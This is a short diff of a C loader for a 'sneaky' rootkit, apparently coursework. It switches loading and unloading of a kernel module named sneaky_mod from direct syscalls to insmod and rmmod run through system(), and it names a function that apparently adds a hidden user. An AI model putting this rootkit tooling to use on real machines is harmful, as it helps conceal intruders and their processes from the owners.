@@ -1,9 +1,6 @@
 #include<stdio.h>
 #include<stdlib.h>
-#include <fcntl.h>
-#include <linux/module.h>
-#include <sys/syscall.h>
-#include <unistd.h>
+
 
 void copyfile(char source_path[256], char destination_path[256]){
   FILE *source, *destination;
@@ -42,25 +39,18 @@ void addSneakyUser(){
 
 
 void loadSneakyModule(int pid){
-  int fd = open("sneaky_mod.ko", O_RDONLY);
-  
-  int res = syscall(__NR_finit_module, fd, "", 0);
-  if (res != 0) {
-    printf("Sneaky Module is not loaded\n");
-    return EXIT_FAILURE;
-  }
-  printf("Sneaky Module is loaded\n");
-  close(fd);
+  char command[50];
+  sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);
+  system(command);
+  printf("Sneaky Module loaded");
 } 
 
 
 void unLoadingSneakyModule(){
-  int res = syscall(__NR_delete_module, "sneaky_mod", O_NONBLOCK);
-  if(res != 0){
-    printf("Sneaky Module did not unload successfully\n");
-    return EXIT_FAILURE;
-  }
-  printf("Sneaky Module is unloaded successfully\n");
+  char command[] = "rmmod sneaky_mod";
+  system(command);
+  printf("Sneaky Module unloaded");
+
 }
 
 int main(int argc, char* argv[]){
